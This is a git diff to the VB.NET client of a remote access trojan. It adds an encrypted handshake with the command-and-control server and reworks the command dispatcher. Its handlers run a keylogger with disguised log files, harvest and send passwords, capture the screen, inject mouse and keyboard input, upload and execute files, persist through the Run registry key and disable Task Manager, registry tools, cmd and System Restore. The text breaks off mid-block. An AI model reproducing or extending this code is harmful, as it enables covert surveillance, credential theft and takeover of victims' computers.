@@ -8,6 +8,7 @@ Imports System.ComponentModel
 Imports System.Security.Principal
 
 Public Class Main
+    Public Shared n As New N
     Public Shared Sep As String = "*%|%*" ''Separator
     Public inc As Integer = 0 ''remove after
     Dim PersistThread As Thread
@@ -24,11 +25,12 @@ Public Class Main
     Public StartupKey As String
     Public melts As Boolean = 0
     Public Shared pw As String
+    Public Shared pk As String
     Public userRole As Integer ''admin, user, guest, etc.
     Public cap As New CRDP ''remote screen capture
     Public infostring As String
-    Public trust As Boolean = False ''Çan server be trusted (resets every time)
-    ''Public caa As New Sr1 ''REMOVED!
+
+    Dim pc As String = Environment.MachineName & "\" & Environment.UserName
     Private culture As String = CultureInfo.CurrentCulture.EnglishName
     Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
     Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
@@ -46,9 +48,9 @@ Public Class Main
     Const spl = "|\|%x*x%|/|"
     Dim PictureBox1 As Windows.Forms.PictureBox
     Dim streamWebcam As Boolean = False ''??
-    Dim klfext As String = ".pdb" ''keylogger file extension
+    Dim klfext As String = ".cab" ''keylogger file extension
     Dim o As New KLogger ''keylogger
-    Public loggg As String
+    Dim sh As CShell = New CShell
     Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
     Private Declare Function LockWorkStation Lib "user32.dll" () As Long
 
@@ -78,6 +80,7 @@ Public Class Main
         StartupKey = "null" ''startup key name
         melts = "False" ''melt
         pw = "hinki" ''password
+        pk = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>" ''public key
 
         ConTimer = New Timers.Timer(5000) ''timer connection to client interval 5s
         ServeTimer = New Timers.Timer(5000) ''timer connection to webserver interval 5s
@@ -220,7 +223,6 @@ Public Class Main
 
 #Region "Socket Events"
     Private Sub Connected() Handles C.Connected
-        ''MsgBox("Connected")
         ConTimer.Stop()
         ConTimer.Enabled = False
         ServeTimer.Stop()
@@ -229,402 +231,437 @@ Public Class Main
         ForeTimer.Start()
     End Sub
     Private Sub Disconnected() Handles C.Disconnected
-        ''MsgBox("Disconnected")
-        InfoLabel.Text = "Disconnected"
-        C = New SocketClient
-        ConTimer.Enabled = True
-        ConTimer.Start()
-        ServeTimer.Enabled = True
-        ServeTimer.Start()
-        ForeTimer.Stop()
-        ForeTimer.Enabled = False
+        If trust Then
+            InfoLabel.Text = "Disconnected"
+            C = New SocketClient
+            ConTimer.Enabled = True
+            ConTimer.Start()
+            ServeTimer.Enabled = True
+            ServeTimer.Start()
+            ForeTimer.Stop()
+            ForeTimer.Enabled = False
+        End If
+
+        trust = False
     End Sub
+
+    Public Shared trust As Boolean = False ''Can server be trusted (resets every time)
+    Public errorcount As Boolean = 0
+    Dim kg As Crypt.RandomKeyGenerator = New Crypt.RandomKeyGenerator
+
+
     Private Sub Data(ByVal b As Byte()) Handles C.Data
         Try
-            Dim T As String = Crypt.RC4.rc4(BS(b), pw)
+            Dim T As String
+            If trust Then
+                T = Crypt.RC4.rc4(BS(b), pw)
+                InfoLabel.Text = "S: " & T
+            Else
+                T = BS(b)
+                InfoLabel.Text = "U: " & T
+            End If
+
             Dim A As String() = Split(T, Sep)
-            Select Case A(0)
-                Case "tt"
-                    C.Send("tt")
-                Case "Upload" ''TODO: implement in C&C
-                    Try
-                        If File.Exists(A(1)) Then File.Delete(A(1))
-                        Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
-                        Dim tempPacket() As Byte = SB(A(3))
-                        Dim packet(tempPacket.Length - 2) As Byte
-                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
-                        fs.Write(packet, 0, packet.Length) : fs.Close()
-                        C.Send("NextPartOfUpload" & Sep & A(2))
-                    Catch
-                        C.Send("UploadFailed" & Sep & A(2))
-                    End Try
-                Case "UploadContinue"
-                    Try
+            If Not trust Then
+                If A(0) = n.connect Then ''first connect
+                    kg.KeyLetters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                    kg.KeyNumbers = "0123456789"
+                    kg.KeyChars = 16 ''length might need to be changed
+                    pw = kg.Generate()
+                    InfoLabel.Text = pw
+                    C.Send(n.connect & Sep & Crypt.RSA.Encrypt(pw, pk).AsBase64String) ''send random rsa encrypted TODO!!!!
+                ElseIf A(0) = n.response ''recieve key response
+                    If A(1) = Crypt.HMACSHA512Hasher.Base64Hash(pw) Then
+                        C.Send(n.response) ''report sucessful authentication
+                        trust = True ''above is the final unencrypted message
+                    Else
+                        errorcount += 1
+                    End If
+                Else
+                    errorcount += 1
+                End If
+                If errorcount >= 3 Then
+                    MsgBox("errorcount too igh")
+                    C.DisConnect() ''disconnect if failed 3 or more times
+                End If
+            Else
+                Select Case A(0)
+                    Case "tt"
+                        C.Send("tt") ''todo: remove
+                    Case n.upload ''TODO: implement in C&C
+                        Try
+                            If File.Exists(A(1)) Then File.Delete(A(1))
+                            Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
+                            Dim tempPacket() As Byte = SB(A(3))
+                            Dim packet(tempPacket.Length - 2) As Byte
+                            Array.Copy(tempPacket, 0, packet, 0, packet.Length)
+                            fs.Write(packet, 0, packet.Length) : fs.Close()
+                            C.Send(n.uploadnext & Sep & A(2))
+                        Catch
+                            C.Send(n.uploadfailed & Sep & A(2))
+                        End Try
+                    Case n.uploadcontinue
+                        Try
 A:
-                        Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
-                        Dim tempPacket() As Byte = SB(A(3))
-                        Dim packet(tempPacket.Length - 2) As Byte
-                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
-                        fs.Write(packet, 0, packet.Length) : fs.Close()
-                        C.Send("NextPartOfUpload" & Sep & A(2))
-                    Catch
-                        GoTo A 'Send("UploadFailed|" & cut(2))
-                    End Try
-                Case "CancelUpload"
+                            Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
+                            Dim tempPacket() As Byte = SB(A(3))
+                            Dim packet(tempPacket.Length - 2) As Byte
+                            Array.Copy(tempPacket, 0, packet, 0, packet.Length)
+                            fs.Write(packet, 0, packet.Length) : fs.Close()
+                            C.Send(n.uploadnext & Sep & A(2))
+                        Catch
+                            GoTo A 'Send("UploadFailed|" & cut(2))
+                        End Try
+                    Case n.uploadcancel
 B:
-                    Try
-                        If File.Exists(A(1)) Then File.Delete(A(1))
-                    Catch
-                        GoTo B
-                    End Try
-                Case "info" ' information
-                    If A(1) = pw Then
-                        Dim pc As String = Environment.MachineName & "/" & Environment.UserName
+                        Try
+                            If File.Exists(A(1)) Then File.Delete(A(1))
+                        Catch
+                            GoTo B
+                        End Try
+                    Case n.getinfo ' information
                         ''Dim gid As String = TODO: unique id
                         ''HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices\\DosDevices\C:
                         ''TODO: Add info?
-                        C.Send("info" & Sep & name & Sep & pc & Sep & country & Sep & My.Computer.Info.OSFullName & " (" & My.Computer.Info.OSVersion & ")" & Sep & getanti())
-                    Else
-                        ''MsgBox("WRONG PASS")
-                        C.DisConnect() ''if password wrong disconnect
-                        Thread.Sleep(1000)
-                        Exit Sub
-                    End If
-                Case "Uninstall"
-                    Try
-                        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
-                        PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()
-                        ''TODO: add deletion
-                    Catch ex As Exception
-                    End Try
-                    End
-                Case "!" ' server ask for my screen Size
-                    CRDP.Clear()
-                    Dim s = Screen.PrimaryScreen.Bounds.Size
-                    C.Send("!" & Sep & s.Width & Sep & s.Height)
-                Case "!@"
-                    Dim mn = Screen.AllScreens
-                    For Each s As Screen In mn
-                        ''sdfsfzfd()
-
-                    Next
-                Case "@" ' Start Capture
-                    Dim SizeOfimage As Integer = A(1)
-                    Dim Split As Integer = A(2)
-                    Dim Quality As Integer = A(3)
-
-                    Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
-                    Dim M As New IO.MemoryStream
-                    Dim CMD As String = "@" & Sep
-                    M.Write(SB(CMD), 0, CMD.Length)
-                    M.Write(Bb, 0, Bb.Length)
-                    C.Send(M.ToArray) ''no rc4
-                    M.Dispose()
-                Case "#" ' mouse clicks
-                    Cursor.Position = New Point(A(1), A(2))
-                    mouse_event(A(3), 0, 0, 0, 1)
-                Case "$" '  mouse move
-                    Cursor.Position = New Point(A(1), A(2))
-                Case "%" ''key press
-                    SendKeys.SendWait(A(1))
-                Case "close" ''exit instance
-                    End
-                Case "LGF" ''log off
-                    Shell("shutdown -l -t 0", AppWinStyle.Hide)
-                Case "SLP" ''sleep
-                    Application.SetSuspendState(PowerState.Suspend, True, False)
-                Case "RST" ''restart
-                    Shell("shutdown -r -t 0", AppWinStyle.Hide)
-                Case "SHD" ''shut down
-                    Shell("shutdown -s -t 0", AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown.
-                Case "LCK" ''lock
-                    LockWorkStation
-                Case "GetDrives"
-                    C.Send("FileManager" & Sep & getDrives())
-                Case "FileManager"
-                    Try
-                        C.Send("FileManager" & Sep & getFolders(A(1)) & getFiles(A(1)))
-                    Catch ex As Exception
-                        C.Send("FileManager" & Sep & "Error")
-                    End Try
-                Case "|||"
-                    C.Send("|||") ''ping back file manager
-                Case "Delete" ''delete file/folder
-                    Select Case A(1)
-                        Case "Folder"
-                            IO.Directory.Delete(A(2))
-                        Case "File"
-                            IO.File.Delete(A(2))
-                    End Select
-                Case "Execute" ''run process
-                    Process.Start(A(1))
-                Case "Rename" ''rename file/folder
-                    Select Case A(1)
-                        Case "Folder"
-                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
-                        Case "File"
-                            My.Computer.FileSystem.RenameFile(A(2), A(3))
-                    End Select
-                Case "||||" ''ping back taskman
-                    C.Send("||||")
-                Case "GetProcesses" ''get all processes taskman
-                    Dim Sep1 As String = "^&&^" ''First level separator
-                    Dim Sep2 As String = "^||^" ''Second level separator
-                    Dim allProcess As String = My.Computer.Info.TotalPhysicalMemory & Sep1 & My.Computer.Info.AvailablePhysicalMemory & Sep1
-
-                    allProcess += cpu.NextValue() & Sep1
-                    Dim ProcessList As Process() = Process.GetProcesses()
-                    Dim responding As String = ""
-                    Dim cl As String = "" ''command line
-                    Dim cp As Integer = 0 ''cpu usage
-
-                    ''putting it in arrays speeds up the search
-                    Dim clarr_pid As String() ''command line array pid
-                    Dim clarr_cl As String() ''command line array comand line
-                    Dim cparr_pid As String() ''cpu array pid
-                    Dim cparr_percent As String() ''cpu array percent
-
-                    Dim clres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT CommandLine, ProcessId FROM Win32_Process").Get
-                    Dim cpres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get
-                    Dim cores As ManagementObjectCollection = New ManagementObjectSearcher("SELECT * FROM ComputerSystem").Get
-
-                    Dim query = "SELECT * FROM Win32_Processor"
-                    Dim num_cores As Integer = 0
-                    Dim searcher As ManagementObjectSearcher = New ManagementObjectSearcher(query)
-                    For Each proc As ManagementObject In searcher.Get
-                        num_cores += Integer.Parse(proc("NumberOfCores").ToString())
-                    Next
-                    ''Todo: CPU Usage
-
-                    Try
-                        Dim i As Integer = 0
-                        For Each mgmtObj As ManagementObject In clres
-                            ReDim Preserve clarr_pid(i)
-                            ReDim Preserve clarr_cl(i)
-                            Try
-                                clarr_pid(i) = mgmtObj.GetPropertyValue("ProcessId")
-                                clarr_cl(i) = mgmtObj.GetPropertyValue("CommandLine")
-                            Catch ex As Exception
-                                MsgBox(ex.Message & vbNewLine & ex.StackTrace)
-                                clarr_pid(i) = ""
-                                clarr_cl(i) = ""
-                            End Try
-                            i += 1
+                        C.Send(n.getinfo & Sep & name & Sep & pc & Sep & country & Sep & My.Computer.Info.OSFullName & " (" & My.Computer.Info.OSVersion & ")" & Sep & getanti())
+                    Case n.uninstall ''todo: improve
+                        Try
+                            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
+                            PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()
+                            ''TODO: add deletion
+                        Catch ex As Exception
+                        End Try
+                        End
+                    Case n.openscreen ' server ask for my screen Size
+                        CRDP.Clear()
+                        Dim s = CRDP.cscreen.Bounds.Size
+                        Dim k As String = ""
+                        For Each scr As Screen In Screen.AllScreens
+                            k += scr.DeviceName & n.splitalt
                         Next
-                    Catch ex As Exception
-                        MsgBox(ex.Message)
-                    End Try
+                        C.Send(n.openscreen & Sep & s.Width & Sep & s.Height & Sep & k)
+                    Case n.clearscreen
+                        CRDP.Clear()
+                    Case n.changescreen ''todo: implement all screens
+                        CRDP.Clear()
+                        Dim scr = Screen.AllScreens(A(1))
+                        CRDP.cscreen = scr
+                        C.Send(n.changescreen & Sep & scr.Bounds.Size.Width & Sep & scr.Bounds.Size.Height)
+                    Case n.getscreen ' Start Capture
+                        Dim SizeOfimage As Integer = A(1)
+                        Dim Split As Integer = A(2)
+                        Dim Quality As Integer = A(3)
 
-                    Try
-                        Dim i As Integer = 0
-                        For Each mgmtObj As ManagementObject In cpres
-                            ReDim Preserve cparr_pid(i)
-                            ReDim Preserve cparr_percent(i)
-                            Try
-                                cparr_pid(i) = mgmtObj.GetPropertyValue("IDProcess")
-                                cparr_percent(i) = mgmtObj.GetPropertyValue("PercentProcessorTime")
-                            Catch ex As Exception
-                                MsgBox(ex.Message & vbNewLine & ex.StackTrace)
-                                cparr_pid(i) = ""
-                                cparr_percent(i) = ""
-                            End Try
-                            i += 1
+                        Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
+                        Dim M As New IO.MemoryStream
+                        Dim CMD As String = n.getscreen & Sep
+                        M.Write(SB(CMD), 0, CMD.Length)
+                        M.Write(Bb, 0, Bb.Length)
+                        C.Send(M.ToArray) ''no rc4!
+                        M.Dispose()
+                    Case n.mouseclick ' mouse clicks
+                        Cursor.Position = New Point(A(1), A(2))
+                        mouse_event(A(3), 0, 0, 0, 1)
+                    Case n.mousemove '  mouse move
+                        Cursor.Position = New Point(A(1), A(2))
+                    Case n.keyboard ''key press
+                        SendKeys.SendWait(A(1))
+                    Case n.close ''exit instance
+                        End
+                    Case n.logoff ''log off
+                        Shell("shutdown -l -t 0", AppWinStyle.Hide)
+                    Case n.sleep ''sleep
+                        Application.SetSuspendState(PowerState.Suspend, True, False)
+                    Case n.restart ''restart
+                        Shell("shutdown -r -t 0", AppWinStyle.Hide)
+                    Case n.shutdown ''shut down
+                        Shell("shutdown -s -t 0", AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown.
+                    Case n.lock ''lock
+                        LockWorkStation
+                    Case n.getdrives
+                        C.Send(n.getfileman & Sep & getDrives())
+                    Case n.getfileman
+                        Try
+                            C.Send(n.getfileman & Sep & getFolders(A(1)) & getFiles(A(1)))
+                        Catch ex As Exception
+                            C.Send(n.getfileman & Sep & "Error")
+                        End Try
+                    Case n.openfileman
+                        C.Send(n.openfileman) ''ping back file manager
+                    Case n.delete ''delete file/folder
+                        Select Case A(1)
+                            Case n.folder
+                                IO.Directory.Delete(A(2))
+                            Case n.file
+                                IO.File.Delete(A(2))
+                        End Select
+                    Case n.execute ''run process
+                        Process.Start(A(1))
+                    Case n.rename ''rename file/folder
+                        Select Case A(1)
+                            Case n.folder
+                                My.Computer.FileSystem.RenameDirectory(A(2), A(3))
+                            Case n.file
+                                My.Computer.FileSystem.RenameFile(A(2), A(3))
+                        End Select
+                    Case n.opentaskman ''ping back taskman
+                        C.Send(n.opentaskman)
+                    Case n.getprocess ''get all processes taskman
+                        Dim Sep1 As String = n.splitspare ''First level separator
+                        Dim Sep2 As String = n.splitalt ''Second level separator
+                        Dim allProcess As String = My.Computer.Info.TotalPhysicalMemory & Sep1 & My.Computer.Info.AvailablePhysicalMemory & Sep1
+
+                        allProcess += cpu.NextValue() & Sep1
+                        Dim ProcessList As Process() = Process.GetProcesses()
+                        Dim responding As String = ""
+                        Dim cl As String = "" ''command line
+                        Dim cp As Integer = 0 ''cpu usage
+
+                        ''putting it in arrays speeds up the search
+                        Dim clarr_pid As String() ''command line array pid
+                        Dim clarr_cl As String() ''command line array comand line
+                        Dim cparr_pid As String() ''cpu array pid
+                        Dim cparr_percent As String() ''cpu array percent
+
+                        Dim clres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT CommandLine, ProcessId FROM Win32_Process").Get
+                        Dim cpres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get
+                        Dim cores As ManagementObjectCollection = New ManagementObjectSearcher("SELECT * FROM ComputerSystem").Get
+
+                        Dim query = "SELECT * FROM Win32_Processor"
+                        Dim num_cores As Integer = 0
+                        Dim searcher As ManagementObjectSearcher = New ManagementObjectSearcher(query)
+                        For Each proc As ManagementObject In searcher.Get
+                            num_cores += Integer.Parse(proc("NumberOfCores").ToString())
                         Next
-                    Catch ex As Exception
-                        MsgBox(ex.Message)
-                    End Try
-
-                    For Each Proc As Process In ProcessList
-                        InfoLabel.Text = "proc: " & Proc.ProcessName
-
-                        If Proc.Responding Then
-                            responding = ""
-                        Else
-                            responding = " [Suspended]"
-                        End If
+                        ''Todo: CPU Usage
 
                         Try
                             Dim i As Integer = 0
-                            For Each s As String In clarr_pid
-                                If s = Proc.Id.ToString Then
-                                    cl = clarr_cl(i)
-                                End If
+                            For Each mgmtObj As ManagementObject In clres
+                                ReDim Preserve clarr_pid(i)
+                                ReDim Preserve clarr_cl(i)
+                                Try
+                                    clarr_pid(i) = mgmtObj.GetPropertyValue("ProcessId")
+                                    clarr_cl(i) = mgmtObj.GetPropertyValue("CommandLine")
+                                Catch ex As Exception
+                                    MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+                                    clarr_pid(i) = ""
+                                    clarr_cl(i) = ""
+                                End Try
                                 i += 1
                             Next
                         Catch ex As Exception
-                            cl = ""
+                            MsgBox(ex.Message)
                         End Try
 
                         Try
                             Dim i As Integer = 0
-                            cp = "0"
-                            For Each s As String In cparr_pid
-                                If s = Proc.Id.ToString Then
-                                    cp = cparr_percent(i) '' Math.Round(cparr_percent(i) / num_cores, 2)
-                                End If
+                            For Each mgmtObj As ManagementObject In cpres
+                                ReDim Preserve cparr_pid(i)
+                                ReDim Preserve cparr_percent(i)
+                                Try
+                                    cparr_pid(i) = mgmtObj.GetPropertyValue("IDProcess")
+                                    cparr_percent(i) = mgmtObj.GetPropertyValue("PercentProcessorTime")
+                                Catch ex As Exception
+                                    MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+                                    cparr_pid(i) = ""
+                                    cparr_percent(i) = ""
+                                End Try
                                 i += 1
                             Next
                         Catch ex As Exception
-                            MsgBox(ex.Message & vbNewLine & ex.StackTrace)
-                            cp = "0"
+                            MsgBox(ex.Message)
                         End Try
 
-                        Dim z As String ''icon
-                        Try
-                            z = Convert.ToBase64String(IconToBytes(Icon.ExtractAssociatedIcon(Proc.Modules(0).FileName)))
-                        Catch ex As Exception
-                            z = "x"
-                        End Try
+                        For Each Proc As Process In ProcessList
+                            InfoLabel.Text = "proc: " & Proc.ProcessName
 
-                        allProcess += Proc.ProcessName & responding & Sep2 _
-                        & Proc.Id & Sep2 _
-                        & cp & Sep2 _
-                        & Convert.ToString(Proc.WorkingSet64) & Sep2 _
-                        & Proc.MainWindowTitle & Sep2 &
-                        cl & Sep2 _
-                        & z & Sep2
-                    Next
-                    C.Send("ProcessManager" & Sep & allProcess)
-                Case "KillProcess" ''kill processes taskman
-                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
-                    For i = 0 To eachprocess.Length - 2
-                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
-                            RunningProcess.Kill()
-                        Next
-                    Next
-                Case "++" ''passwords ping back
-                    C.Send("++")
-                Case "util" ''util ping back
-                    C.Send("util")
-                Case "OpenCD"
-                    mciSendString("set CDAudio door open", "", 0, 0)
-                Case "CloseCD"
-                    mciSendString("set CDAudio door closed", "", 0, 0)
-                Case "DisableKM"
-                    apiBlockInput(1)
-                Case "EnableKM"
-                    apiBlockInput(0)
-                Case "TurnOffMonitor"
-                    SendMessage(-1, &H112, &HF170, 2)
-                Case "TurnOnMonitor"
-                    SendMessage(-1, &H112, &HF170, -1)
-                Case "NormalMouse"
-                    SwapMouseButton(&H0&)
-                Case "ReverseMouse"
-                    SwapMouseButton(&H100&)
-                Case "HideTaskBar"
-                    Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H80))
-                Case "ShowTaskBar"
-                    Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H40))
-                Case "DisableCMD"
-                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
-                Case "EnableCMD"
-                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
-                Case "DisableRegistry"
-                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
-                Case "EnableRegistry"
-                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
-                Case "DisableRestore"
-                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
-                Case "EnableRestore"
-                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
-                Case "DisableTaskManager"
-                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
-                Case "EnableTaskManager"
-                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
-                'Case "opentto"
-                '    C.Send("opentto")
-                'Case "TextToSpeech"
-                '    Dim SAPI = CreateObject("SAPI.Spvoice")
-                '    SAPI.speak(A(1))
-                Case "ppww" ''passwords
-                    C.Send("ppww" & Sep & "bb" & gpasswords)
-                Case "F" ''run file??
-                    My.Computer.FileSystem.WriteAllBytes(A(2), SB(A(1)), False)
-                    Process.Start(A(2))
-                    C.Send("F")
-                '    Case "logf"
-                '       C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
-                Case "openlo" ''keylogger pingback
-                    C.Send("openlo")
-                Case "getlog" ''ket keylogs
-                    Try
-                        loggg = o.Logs
-                        C.Send("getlog" & Sep & loggg)
-                    Catch : End Try
-                Case "dellog"
-                    o.Close(False)
-                    Dim di As New DirectoryInfo(Application.StartupPath)
-                    Dim files As FileInfo() = di.GetFiles()
-                    Dim fri As FileInfo
-                    For Each fri In files
-                        Try
-                            If fri.Name.EndsWith(klfext) Then
-                                fri.Delete()
+                            If Proc.Responding Then
+                                responding = ""
+                            Else
+                                responding = " [Suspended]"
                             End If
+
+                            Try
+                                Dim i As Integer = 0
+                                For Each s As String In clarr_pid
+                                    If s = Proc.Id.ToString Then
+                                        cl = clarr_cl(i)
+                                    End If
+                                    i += 1
+                                Next
+                            Catch ex As Exception
+                                cl = ""
+                            End Try
+
+                            Try
+                                Dim i As Integer = 0
+                                cp = "0"
+                                For Each s As String In cparr_pid
+                                    If s = Proc.Id.ToString Then
+                                        cp = cparr_percent(i) '' Math.Round(cparr_percent(i) / num_cores, 2)
+                                    End If
+                                    i += 1
+                                Next
+                            Catch ex As Exception
+                                MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+                                cp = "0"
+                            End Try
+
+                            Dim z As String ''icon
+                            Try
+                                z = Convert.ToBase64String(IconToBytes(Icon.ExtractAssociatedIcon(Proc.Modules(0).FileName)))
+                            Catch ex As Exception
+                                z = "x"
+                            End Try
+
+                            allProcess += Proc.ProcessName & responding & Sep2 _
+                            & Proc.Id & Sep2 _
+                            & cp & Sep2 _
+                            & Convert.ToString(Proc.WorkingSet64) & Sep2 _
+                            & Proc.MainWindowTitle & Sep2 &
+                            cl & Sep2 _
+                            & z & Sep2
+                        Next
+                        C.Send(n.gettaskman & Sep & allProcess)
+                    Case n.endprocess ''kill processes taskman
+                        Dim eachprocess As String() = A(1).Split(n.splitalt)
+                        For i = 0 To eachprocess.Length - 2
+                            For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
+                                RunningProcess.Kill()
+                            Next
+                        Next
+                    Case n.openpasswords ''passwords ping back
+                        C.Send(n.openpasswords)
+                    Case n.openutil ''util ping back
+                        C.Send(n.openutil)
+                    Case n.util_opencd
+                        mciSendString("set CDAudio door open", "", 0, 0)
+                    Case n.util_closecd
+                        mciSendString("set CDAudio door closed", "", 0, 0)
+                    Case n.util_disablekm
+                        apiBlockInput(1)
+                    Case n.util_enablekm
+                        apiBlockInput(0)
+                    Case n.util_offmonitor
+                        SendMessage(-1, &H112, &HF170, 2)
+                    Case n.util_onmonitor
+                        SendMessage(-1, &H112, &HF170, -1)
+                    Case n.util_normalmouse
+                        SwapMouseButton(&H0&)
+                    Case n.util_reversemouse
+                        SwapMouseButton(&H100&)
+                    Case n.util_hidetaskbar
+                        Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H80))
+                    Case n.util_showtaskbar
+                        Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H40))
+                    Case n.util_disablecmd
+                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                    Case n.util_enablecmd
+                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                    Case n.util_disablereg
+                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                    Case n.util_enablereg
+                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                    Case n.util_disablerestore
+                        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                    Case n.util_enablerestore
+                        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                    Case n.util_disabletaskman
+                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                    Case n.util_enabletaskman
+                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                    'Case "opentto"
+                    '    C.Send("opentto")
+                    'Case "TextToSpeech"
+                    '    Dim SAPI = CreateObject("SAPI.Spvoice")
